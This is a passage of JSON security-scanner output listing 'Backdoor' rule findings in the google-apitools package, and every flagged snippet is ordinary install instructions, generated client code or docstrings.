            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/README.rst"
                },
                "region": {
                  "startLine": 43,
                  "startColumn": 4,
                  "endLine": 43,
                  "endColumn": 9,
                  "snippet": {
                    "text": "\nand the ``nose`` testrunner::\n\n   $ pip install nose\n\nThen run the tests::\n\n",
                    "rendered": {
                      "text": "\nand the ``nose`` testrunner::\n\n   $ pip install nose\n\nThen run the tests::\n\n",
                      "markdown": "`\nand the ``nose`` testrunner::\n\n   $ pip install nose\n\nThen run the tests::\n\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/README.rst"
                },
                "region": {
                  "startLine": 39,
                  "startColumn": 4,
                  "endLine": 39,
                  "endColumn": 9,
                  "snippet": {
                    "text": "\nFirst, install the testing dependencies::\n\n   $ pip install google-apitools[testing]\n\nand the ``nose`` testrunner::\n\n",
                    "rendered": {
                      "text": "\nFirst, install the testing dependencies::\n\n   $ pip install google-apitools[testing]\n\nand the ``nose`` testrunner::\n\n",
                      "markdown": "`\nFirst, install the testing dependencies::\n\n   $ pip install google-apitools[testing]\n\nand the ``nose`` testrunner::\n\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/README.rst"
                },
                "region": {
                  "startLine": 32,
                  "startColumn": 4,
                  "endLine": 32,
                  "endColumn": 9,
                  "snippet": {
                    "text": "\nTo install the command-line scripts into the current virtual environment::\n\n   $ pip install google-apitools[cli]\n\nRunning the tests\n-----------------\n",
                    "rendered": {
                      "text": "\nTo install the command-line scripts into the current virtual environment::\n\n   $ pip install google-apitools[cli]\n\nRunning the tests\n-----------------\n",
                      "markdown": "`\nTo install the command-line scripts into the current virtual environment::\n\n   $ pip install google-apitools[cli]\n\nRunning the tests\n-----------------\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/README.rst"
                },
                "region": {
                  "startLine": 25,
                  "startColumn": 4,
                  "endLine": 25,
                  "endColumn": 9,
                  "snippet": {
                    "text": "\nTo install the library into the current virtual environment::\n\n   $ pip install google-apitools\n\nInstalling the command-line tools\n---------------------------------\n",
                    "rendered": {
                      "text": "\nTo install the library into the current virtual environment::\n\n   $ pip install google-apitools\n\nInstalling the command-line tools\n---------------------------------\n",
                      "markdown": "`\nTo install the library into the current virtual environment::\n\n   $ pip install google-apitools\n\nInstalling the command-line tools\n---------------------------------\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000804"
          },
          "message": {
            "text": "Backdoor: Long Strings",
            "id": "BD000804"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1/servicemanagement_v1_client.py"
                },
                "region": {
                  "startLine": 821,
                  "startColumn": 26,
                  "endLine": 821,
                  "endColumn": 72,
                  "snippet": {
                    "text": "        query_params=['updateMask'],\n        relative_path='v1/services/{serviceName}/config',\n        request_field='service',\n        request_type_name='ServicemanagementServicesUpdateConfigRequest',\n        response_type_name='Operation',\n        supports_download=False,\n    )\n",
                    "rendered": {
                      "text": "        query_params=['updateMask'],\n        relative_path='v1/services/{serviceName}/config',\n        request_field='service',\n        request_type_name='ServicemanagementServicesUpdateConfigRequest',\n        response_type_name='Operation',\n        supports_download=False,\n    )\n",
                      "markdown": "`        query_params=['updateMask'],\n        relative_path='v1/services/{serviceName}/config',\n        request_field='service',\n        request_type_name='ServicemanagementServicesUpdateConfigRequest',\n        response_type_name='Operation',\n        supports_download=False,\n    )\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 2
          }
        },
        {
          "rule": {
            "id": "BD000804"
          },
          "message": {
            "text": "Backdoor: Long Strings",
            "id": "BD000804"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1/servicemanagement_v1_client.py"
                },
                "region": {
                  "startLine": 736,
                  "startColumn": 26,
                  "endLine": 736,
                  "endColumn": 71,
                  "snippet": {
                    "text": "        query_params=['updateMask'],\n        relative_path='v1/services/{serviceName}/config',\n        request_field='service',\n        request_type_name='ServicemanagementServicesPatchConfigRequest',\n        response_type_name='Operation',\n        supports_download=False,\n    )\n",
                    "rendered": {
                      "text": "        query_params=['updateMask'],\n        relative_path='v1/services/{serviceName}/config',\n        request_field='service',\n        request_type_name='ServicemanagementServicesPatchConfigRequest',\n        response_type_name='Operation',\n        supports_download=False,\n    )\n",
                      "markdown": "`        query_params=['updateMask'],\n        relative_path='v1/services/{serviceName}/config',\n        request_field='service',\n        request_type_name='ServicemanagementServicesPatchConfigRequest',\n        response_type_name='Operation',\n        supports_download=False,\n    )\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 2
          }
        },
        {
          "rule": {
            "id": "BD000804"
          },
          "message": {
            "text": "Backdoor: Long Strings",
            "id": "BD000804"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1/servicemanagement_v1_client.py"
                },
                "region": {
                  "startLine": 651,
                  "startColumn": 26,
                  "endLine": 651,
                  "endColumn": 69,
                  "snippet": {
                    "text": "        query_params=['configId'],\n        relative_path='v1/services/{serviceName}/config',\n        request_field='',\n        request_type_name='ServicemanagementServicesGetConfigRequest',\n        response_type_name='Service',\n        supports_download=False,\n    )\n",
                    "rendered": {
                      "text": "        query_params=['configId'],\n        relative_path='v1/services/{serviceName}/config',\n        request_field='',\n        request_type_name='ServicemanagementServicesGetConfigRequest',\n        response_type_name='Service',\n        supports_download=False,\n    )\n",
                      "markdown": "`        query_params=['configId'],\n        relative_path='v1/services/{serviceName}/config',\n        request_field='',\n        request_type_name='ServicemanagementServicesGetConfigRequest',\n        response_type_name='Service',\n        supports_download=False,\n    )\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 2
          }
        },
        {
          "rule": {
            "id": "BD000804"
          },
          "message": {
            "text": "Backdoor: Long Strings",
            "id": "BD000804"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1/servicemanagement_v1_client.py"
                },
                "region": {
                  "startLine": 624,
                  "startColumn": 26,
                  "endLine": 624,
                  "endColumn": 75,
                  "snippet": {
                    "text": "        query_params=[],\n        relative_path='v1/services/{serviceName}/accessPolicy',\n        request_field='',\n        request_type_name='ServicemanagementServicesGetAccessPolicyRequest',\n        response_type_name='ServiceAccessPolicy',\n        supports_download=False,\n    )\n",
                    "rendered": {
                      "text": "        query_params=[],\n        relative_path='v1/services/{serviceName}/accessPolicy',\n        request_field='',\n        request_type_name='ServicemanagementServicesGetAccessPolicyRequest',\n        response_type_name='ServiceAccessPolicy',\n        supports_download=False,\n    )\n",
                      "markdown": "`        query_params=[],\n        relative_path='v1/services/{serviceName}/accessPolicy',\n        request_field='',\n        request_type_name='ServicemanagementServicesGetAccessPolicyRequest',\n        response_type_name='ServiceAccessPolicy',\n        supports_download=False,\n    )\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 2
          }
        },
        {
          "rule": {
            "id": "BD000804"
          },
          "message": {
            "text": "Backdoor: Long Strings",
            "id": "BD000804"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1/servicemanagement_v1_client.py"
                },
                "region": {
                  "startLine": 384,
                  "startColumn": 26,
                  "endLine": 384,
                  "endColumn": 80,
                  "snippet": {
                    "text": "        query_params=['updateMask'],\n        relative_path='v1/services/{serviceName}/projectSettings/{consumerProjectId}',\n        request_field='projectSettings',\n        request_type_name='ServicemanagementServicesProjectSettingsPatchRequest',\n        response_type_name='Operation',\n        supports_download=False,\n    )\n",
                    "rendered": {
                      "text": "        query_params=['updateMask'],\n        relative_path='v1/services/{serviceName}/projectSettings/{consumerProjectId}',\n        request_field='projectSettings',\n        request_type_name='ServicemanagementServicesProjectSettingsPatchRequest',\n        response_type_name='Operation',\n        supports_download=False,\n    )\n",
                      "markdown": "`        query_params=['updateMask'],\n        relative_path='v1/services/{serviceName}/projectSettings/{consumerProjectId}',\n        request_field='projectSettings',\n        request_type_name='ServicemanagementServicesProjectSettingsPatchRequest',\n        response_type_name='Operation',\n        supports_download=False,\n    )\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 2
          }
        },
        {
          "rule": {
            "id": "BD000804"
          },
          "message": {
            "text": "Backdoor: Long Strings",
            "id": "BD000804"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1/servicemanagement_v1_client.py"
                },
                "region": {
                  "startLine": 354,
                  "startColumn": 26,
                  "endLine": 354,
                  "endColumn": 78,
                  "snippet": {
                    "text": "        query_params=['expand', 'view'],\n        relative_path='v1/services/{serviceName}/projectSettings/{consumerProjectId}',\n        request_field='',\n        request_type_name='ServicemanagementServicesProjectSettingsGetRequest',\n        response_type_name='ProjectSettings',\n        supports_download=False,\n    )\n",
                    "rendered": {
                      "text": "        query_params=['expand', 'view'],\n        relative_path='v1/services/{serviceName}/projectSettings/{consumerProjectId}',\n        request_field='',\n        request_type_name='ServicemanagementServicesProjectSettingsGetRequest',\n        response_type_name='ProjectSettings',\n        supports_download=False,\n    )\n",
                      "markdown": "`        query_params=['expand', 'view'],\n        relative_path='v1/services/{serviceName}/projectSettings/{consumerProjectId}',\n        request_field='',\n        request_type_name='ServicemanagementServicesProjectSettingsGetRequest',\n        response_type_name='ProjectSettings',\n        supports_download=False,\n    )\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 2
          }
        },
        {
          "rule": {
            "id": "BD000804"
          },
          "message": {
            "text": "Backdoor: Long Strings",
            "id": "BD000804"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1/servicemanagement_v1_client.py"
                },
                "region": {
                  "startLine": 317,
                  "startColumn": 26,
                  "endLine": 317,
                  "endColumn": 81,
                  "snippet": {
                    "text": "        query_params=['updateMask'],\n        relative_path='v1/services/{serviceName}/customerSettings/{customerId}',\n        request_field='customerSettings',\n        request_type_name='ServicemanagementServicesCustomerSettingsPatchRequest',\n        response_type_name='Operation',\n        supports_download=False,\n    )\n",
                    "rendered": {
                      "text": "        query_params=['updateMask'],\n        relative_path='v1/services/{serviceName}/customerSettings/{customerId}',\n        request_field='customerSettings',\n        request_type_name='ServicemanagementServicesCustomerSettingsPatchRequest',\n        response_type_name='Operation',\n        supports_download=False,\n    )\n",
                      "markdown": "`        query_params=['updateMask'],\n        relative_path='v1/services/{serviceName}/customerSettings/{customerId}',\n        request_field='customerSettings',\n        request_type_name='ServicemanagementServicesCustomerSettingsPatchRequest',\n        response_type_name='Operation',\n        supports_download=False,\n    )\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 2
          }
        },
        {
          "rule": {
            "id": "BD000804"
          },
          "message": {
            "text": "Backdoor: Long Strings",
            "id": "BD000804"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1/servicemanagement_v1_client.py"
                },
                "region": {
                  "startLine": 287,
                  "startColumn": 26,
                  "endLine": 287,
                  "endColumn": 79,
                  "snippet": {
                    "text": "        query_params=['expand', 'view'],\n        relative_path='v1/services/{serviceName}/customerSettings/{customerId}',\n        request_field='',\n        request_type_name='ServicemanagementServicesCustomerSettingsGetRequest',\n        response_type_name='CustomerSettings',\n        supports_download=False,\n    )\n",
                    "rendered": {
                      "text": "        query_params=['expand', 'view'],\n        relative_path='v1/services/{serviceName}/customerSettings/{customerId}',\n        request_field='',\n        request_type_name='ServicemanagementServicesCustomerSettingsGetRequest',\n        response_type_name='CustomerSettings',\n        supports_download=False,\n    )\n",
                      "markdown": "`        query_params=['expand', 'view'],\n        relative_path='v1/services/{serviceName}/customerSettings/{customerId}',\n        request_field='',\n        request_type_name='ServicemanagementServicesCustomerSettingsGetRequest',\n        response_type_name='CustomerSettings',\n        supports_download=False,\n    )\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 2
          }
        },
        {
          "rule": {
            "id": "BD000804"
          },
          "message": {
            "text": "Backdoor: Long Strings",
            "id": "BD000804"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1/servicemanagement_v1_client.py"
                },
                "region": {
                  "startLine": 250,
                  "startColumn": 26,
                  "endLine": 250,
                  "endColumn": 73,
                  "snippet": {
                    "text": "        query_params=[],\n        relative_path='v1/services/{serviceName}/configs:submit',\n        request_field='submitConfigSourceRequest',\n        request_type_name='ServicemanagementServicesConfigsSubmitRequest',\n        response_type_name='Operation',\n        supports_download=False,\n    )\n",
                    "rendered": {
                      "text": "        query_params=[],\n        relative_path='v1/services/{serviceName}/configs:submit',\n        request_field='submitConfigSourceRequest',\n        request_type_name='ServicemanagementServicesConfigsSubmitRequest',\n        response_type_name='Operation',\n        supports_download=False,\n    )\n",
                      "markdown": "`        query_params=[],\n        relative_path='v1/services/{serviceName}/configs:submit',\n        request_field='submitConfigSourceRequest',\n        request_type_name='ServicemanagementServicesConfigsSubmitRequest',\n        response_type_name='Operation',\n        supports_download=False,\n    )\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 2
          }
        },
        {
          "rule": {
            "id": "BD000804"
          },
          "message": {
            "text": "Backdoor: Long Strings",
            "id": "BD000804"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1/servicemanagement_v1_client.py"
                },
                "region": {
                  "startLine": 218,
                  "startColumn": 26,
                  "endLine": 218,
                  "endColumn": 71,
                  "snippet": {
                    "text": "        query_params=['pageSize', 'pageToken'],\n        relative_path='v1/services/{serviceName}/configs',\n        request_field='',\n        request_type_name='ServicemanagementServicesConfigsListRequest',\n        response_type_name='ListServiceConfigsResponse',\n        supports_download=False,\n    )\n",
                    "rendered": {
                      "text": "        query_params=['pageSize', 'pageToken'],\n        relative_path='v1/services/{serviceName}/configs',\n        request_field='',\n        request_type_name='ServicemanagementServicesConfigsListRequest',\n        response_type_name='ListServiceConfigsResponse',\n        supports_download=False,\n    )\n",
                      "markdown": "`        query_params=['pageSize', 'pageToken'],\n        relative_path='v1/services/{serviceName}/configs',\n        request_field='',\n        request_type_name='ServicemanagementServicesConfigsListRequest',\n        response_type_name='ListServiceConfigsResponse',\n        supports_download=False,\n    )\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 2
          }
        },
        {
          "rule": {
            "id": "BD000804"
          },
          "message": {
            "text": "Backdoor: Long Strings",
            "id": "BD000804"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1/servicemanagement_v1_client.py"
                },
                "region": {
                  "startLine": 191,
                  "startColumn": 26,
                  "endLine": 191,
                  "endColumn": 70,
                  "snippet": {
                    "text": "        query_params=[],\n        relative_path='v1/services/{serviceName}/configs/{configId}',\n        request_field='',\n        request_type_name='ServicemanagementServicesConfigsGetRequest',\n        response_type_name='Service',\n        supports_download=False,\n    )\n",
                    "rendered": {
                      "text": "        query_params=[],\n        relative_path='v1/services/{serviceName}/configs/{configId}',\n        request_field='',\n        request_type_name='ServicemanagementServicesConfigsGetRequest',\n        response_type_name='Service',\n        supports_download=False,\n    )\n",
                      "markdown": "`        query_params=[],\n        relative_path='v1/services/{serviceName}/configs/{configId}',\n        request_field='',\n        request_type_name='ServicemanagementServicesConfigsGetRequest',\n        response_type_name='Service',\n        supports_download=False,\n    )\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 2
          }
        },
        {
          "rule": {
            "id": "BD000804"
          },
          "message": {
            "text": "Backdoor: Long Strings",
            "id": "BD000804"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1/servicemanagement_v1_client.py"
                },
                "region": {
                  "startLine": 164,
                  "startColumn": 26,
                  "endLine": 164,
                  "endColumn": 73,
                  "snippet": {
                    "text": "        query_params=[],\n        relative_path='v1/services/{serviceName}/configs',\n        request_field='service',\n        request_type_name='ServicemanagementServicesConfigsCreateRequest',\n        response_type_name='Service',\n        supports_download=False,\n    )\n",
                    "rendered": {
                      "text": "        query_params=[],\n        relative_path='v1/services/{serviceName}/configs',\n        request_field='service',\n        request_type_name='ServicemanagementServicesConfigsCreateRequest',\n        response_type_name='Service',\n        supports_download=False,\n    )\n",
                      "markdown": "`        query_params=[],\n        relative_path='v1/services/{serviceName}/configs',\n        request_field='service',\n        request_type_name='ServicemanagementServicesConfigsCreateRequest',\n        response_type_name='Service',\n        supports_download=False,\n    )\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 2
          }
        },
        {
          "rule": {
            "id": "BD000804"
          },
          "message": {
            "text": "Backdoor: Long Strings",
            "id": "BD000804"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1/servicemanagement_v1_client.py"
                },
                "region": {
                  "startLine": 126,
                  "startColumn": 26,
                  "endLine": 126,
                  "endColumn": 77,
                  "snippet": {
                    "text": "        query_params=['userEmail'],\n        relative_path='v1/services/{serviceName}/accessPolicy:query',\n        request_field='',\n        request_type_name='ServicemanagementServicesAccessPolicyQueryRequest',\n        response_type_name='QueryUserAccessResponse',\n        supports_download=False,\n    )\n",
                    "rendered": {
                      "text": "        query_params=['userEmail'],\n        relative_path='v1/services/{serviceName}/accessPolicy:query',\n        request_field='',\n        request_type_name='ServicemanagementServicesAccessPolicyQueryRequest',\n        response_type_name='QueryUserAccessResponse',\n        supports_download=False,\n    )\n",
                      "markdown": "`        query_params=['userEmail'],\n        relative_path='v1/services/{serviceName}/accessPolicy:query',\n        request_field='',\n        request_type_name='ServicemanagementServicesAccessPolicyQueryRequest',\n        response_type_name='QueryUserAccessResponse',\n        supports_download=False,\n    )\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 2
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1/servicemanagement_v1_client.py"
                },
                "region": {
                  "startLine": 771,
                  "startColumn": 28,
                  "endLine": 771,
                  "endColumn": 36,
                  "snippet": {
                    "text": "    )\n\n    def UpdateAccessPolicy(self, request, global_params=None):\n      r\"\"\"Producer method to update the current policy.  This method will return an.\nerror if the policy is too large (more than 50 entries across all lists).\n\n      Args:\n",
                    "rendered": {
                      "text": "    )\n\n    def UpdateAccessPolicy(self, request, global_params=None):\n      r\"\"\"Producer method to update the current policy.  This method will return an.\nerror if the policy is too large (more than 50 entries across all lists).\n\n      Args:\n",
                      "markdown": "`    )\n\n    def UpdateAccessPolicy(self, request, global_params=None):\n      r\"\"\"Producer method to update the current policy.  This method will return an.\nerror if the policy is too large (more than 50 entries across all lists).\n\n      Args:\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1/servicemanagement_v1_client.py"
                },
                "region": {
                  "startLine": 393,
                  "startColumn": 28,
                  "endLine": 393,
                  "endColumn": 36,
                  "snippet": {
                    "text": "      r\"\"\"NOTE: Currently unsupported.  Use PatchProjectSettings instead.\n\nUpdates the settings that control the specified consumer project's usage\nof the service.  Attempts to update a field not controlled by the caller\nwill result in an access denied error.\n\nOperation<response: ProjectSettings>\n",
                    "rendered": {
                      "text": "      r\"\"\"NOTE: Currently unsupported.  Use PatchProjectSettings instead.\n\nUpdates the settings that control the specified consumer project's usage\nof the service.  Attempts to update a field not controlled by the caller\nwill result in an access denied error.\n\nOperation<response: ProjectSettings>\n",
                      "markdown": "`      r\"\"\"NOTE: Currently unsupported.  Use PatchProjectSettings instead.\n\nUpdates the settings that control the specified consumer project's usage\nof the service.  Attempts to update a field not controlled by the caller\nwill result in an access denied error.\n\nOperation<response: ProjectSettings>\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1/servicemanagement_v1_client.py"
                },
                "region": {
                  "startLine": 392,
                  "startColumn": 25,
                  "endLine": 392,
                  "endColumn": 34,
                  "snippet": {
                    "text": "    def Update(self, request, global_params=None):\n      r\"\"\"NOTE: Currently unsupported.  Use PatchProjectSettings instead.\n\nUpdates the settings that control the specified consumer project's usage\nof the service.  Attempts to update a field not controlled by the caller\nwill result in an access denied error.\n\n",
                    "rendered": {
                      "text": "    def Update(self, request, global_params=None):\n      r\"\"\"NOTE: Currently unsupported.  Use PatchProjectSettings instead.\n\nUpdates the settings that control the specified consumer project's usage\nof the service.  Attempts to update a field not controlled by the caller\nwill result in an access denied error.\n\n",
                      "markdown": "`    def Update(self, request, global_params=None):\n      r\"\"\"NOTE: Currently unsupported.  Use PatchProjectSettings instead.\n\nUpdates the settings that control the specified consumer project's usage\nof the service.  Attempts to update a field not controlled by the caller\nwill result in an access denied error.\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1/servicemanagement_v1_client.py"
                },
                "region": {
                  "startLine": 361,
                  "startColumn": 53,
                  "endLine": 361,
                  "endColumn": 61,
                  "snippet": {
                    "text": "\n    def Patch(self, request, global_params=None):\n      r\"\"\"Updates specified subset of the settings that control the specified.\nconsumer project's usage of the service.  Attempts to update a field not\ncontrolled by the caller will result in an access denied error.\n\nOperation<response: ProjectSettings>\n",
                    "rendered": {
                      "text": "\n    def Patch(self, request, global_params=None):\n      r\"\"\"Updates specified subset of the settings that control the specified.\nconsumer project's usage of the service.  Attempts to update a field not\ncontrolled by the caller will result in an access denied error.\n\nOperation<response: ProjectSettings>\n",
                      "markdown": "`\n    def Patch(self, request, global_params=None):\n      r\"\"\"Updates specified subset of the settings that control the specified.\nconsumer project's usage of the service.  Attempts to update a field not\ncontrolled by the caller will result in an access denied error.\n\nOperation<response: ProjectSettings>\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1/servicemanagement_v1_client.py"
                },
                "region": {
                  "startLine": 360,
                  "startColumn": 55,
                  "endLine": 360,
                  "endColumn": 64,
                  "snippet": {
                    "text": "    )\n\n    def Patch(self, request, global_params=None):\n      r\"\"\"Updates specified subset of the settings that control the specified.\nconsumer project's usage of the service.  Attempts to update a field not\ncontrolled by the caller will result in an access denied error.\n\n",
                    "rendered": {
                      "text": "    )\n\n    def Patch(self, request, global_params=None):\n      r\"\"\"Updates specified subset of the settings that control the specified.\nconsumer project's usage of the service.  Attempts to update a field not\ncontrolled by the caller will result in an access denied error.\n\n",
                      "markdown": "`    )\n\n    def Patch(self, request, global_params=None):\n      r\"\"\"Updates specified subset of the settings that control the specified.\nconsumer project's usage of the service.  Attempts to update a field not\ncontrolled by the caller will result in an access denied error.\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1/servicemanagement_v1_client.py"
                },
                "region": {
                  "startLine": 333,
                  "startColumn": 37,
                  "endLine": 333,
                  "endColumn": 46,
                  "snippet": {
                    "text": "          }\n\n    def Get(self, request, global_params=None):\n      r\"\"\"Retrieves the settings that control the specified consumer project's usage.\nof the service.\n\n      Args:\n",
                    "rendered": {
                      "text": "          }\n\n    def Get(self, request, global_params=None):\n      r\"\"\"Retrieves the settings that control the specified consumer project's usage.\nof the service.\n\n      Args:\n",
                      "markdown": "`          }\n\n    def Get(self, request, global_params=None):\n      r\"\"\"Retrieves the settings that control the specified consumer project's usage.\nof the service.\n\n      Args:\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1/servicemanagement_v1_client.py"
                },
                "region": {
                  "startLine": 294,
                  "startColumn": 45,
                  "endLine": 294,
                  "endColumn": 53,
                  "snippet": {
                    "text": "\n    def Patch(self, request, global_params=None):\n      r\"\"\"Updates specified subset of the settings that control the specified.\ncustomer's usage of the service.  Attempts to update a field not\ncontrolled by the caller will result in an access denied error.\n\nOperation<response: CustomerSettings>\n",
                    "rendered": {
